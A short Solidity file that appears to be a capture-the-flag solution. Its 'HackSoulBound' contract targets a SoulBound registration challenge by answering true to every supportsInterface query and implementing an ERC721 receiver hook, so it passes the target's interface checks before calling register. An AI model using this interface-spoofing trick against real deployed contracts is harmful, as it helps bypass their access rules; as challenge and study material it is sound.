//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

contract SoulBound {
    function register(address) external {}
}

abstract contract ERC721TokenReceiver {
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}

contract HackSoulBound is ERC721TokenReceiver {

        address immutable public owner;
        SoulBound soulBound;

        error NotOwner();

        constructor(address _soulBound) {
            owner = msg.sender;
            soulBound = SoulBound(_soulBound);
        }

        modifier onlyOwner {
            // require(msg.sender == owner);
            if (msg.sender != owner) revert NotOwner();
            _;
        }

        function supportsInterface(bytes4 interfaceID) external view returns (bool) {
            return true;
        }

        function register(address registrant) public onlyOwner {
            soulBound.register(registrant);
        }
}